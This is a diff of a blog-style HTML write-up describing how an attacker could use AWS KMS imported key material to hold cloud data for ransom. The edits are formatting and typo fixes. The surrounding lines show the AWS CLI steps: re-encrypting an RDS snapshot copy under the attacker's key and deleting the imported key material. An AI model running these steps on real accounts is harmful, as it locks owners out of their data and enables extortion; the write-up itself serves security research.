@@ -233,7 +233,8 @@ AWS-managed keys are the default for most services. These keys are in the format
 
 <p>Retrieve parameters for import, this is so you can save the import token and public key. These are temporary and must be used together. Ensure to Base64 decode them to get the raw binary input.</p>
 
-<p><code class="language-plaintext highlighter-rouge">aws kms get-parameters-for-import --key-id &lt;key-id&gt; --wrapping-algorithm RSAES_OAEP_SHA_1 --wrapping-key-spec RSA_2048</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms get-parameters-for-import --key-id &lt;key-id&gt; --wrapping-algorithm RSAES_OAEP_SHA_1 --wrapping-key-spec RSA_2048
+</code></pre></div></div>
 
 <p><img src="/img/kms-ransomware/get-params-for-import.png" alt="image3" width="720" class="mx-auto d-block" /></p>
 
@@ -275,15 +276,16 @@ AWS-managed keys are the default for most services. These keys are in the format
 
 <p><img src="/img/kms-ransomware/pending-rotation.png" alt="image6" width="720" class="mx-auto d-block" /></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms rotate-key-on-demand --key-id &lt;KEY_ID&gt;
+<p>Then to actually rotate the key:</p>
 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms rotate-key-on-demand --key-id &lt;KEY_ID&gt;
 </code></pre></div></div>
 
 <p>The caveat here is that rotating on demand can only be done 10 times per key. This is also exclusive to single-region, symmetric keys. Additionally, once the current imported material is deleted, you cannot rotate the key again.</p>
 
 <h3 id="rds"><strong>RDS</strong></h3>
 
-<p>For this example, we are using a database that is already encrypted. With this technique, the attacker will be able to <em>overwrite</em> the existing encryption, taking control away from the customer.</p>
+<p>For this example, we are using a database that is already encrypted. With this technique, the attacker will be able to<em>overwrite</em>the existing encryption, taking control away from the customer.</p>
 
 <p><img src="/img/kms-ransomware/db-console.png" alt="image7" width="720" class="mx-auto d-block" /></p>
 
@@ -293,7 +295,7 @@ AWS-managed keys are the default for most services. These keys are in the format
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws rds create-db-snapshot --db-snapshot-identifier copy-pasturedb --db-instance-identifier pasturedb
 </code></pre></div></div>
 
-<p><img src="/img/kms-ransomware/copy-db-snapshot.png" alt="image9" width="720" class="mx-auto d-block" /></p>
+<p><img src="/img/kms-ransomware/create-db-snapshot.png" alt="image9" width="720" class="mx-auto d-block" /></p>
 
 <p>Copy the DB Snapshot. In this step it is possible for an attacker to change the newly created snapshot encryption key to their own .</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws rds copy-db-snapshot --source-db-snapshot-identifier copy-pasturedb --target-db-snapshot-identifier ransom-pasturedb --kms-key-id &lt;key-id&gt;
@@ -341,7 +343,7 @@ AWS-managed keys are the default for most services. These keys are in the format
 
 <p><img src="/img/kms-ransomware/ec2-copy-snapshot.png" alt="image16" width="720" class="mx-auto d-block" /></p>
 
-<p>Delete imported key material</p>
+<p>Delete imported key material.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws kms delete-imported-key-material --key-id 8a5bf6e0-bc70-47fb-9d13-a98bb8afb5f2
 </code></pre></div></div>
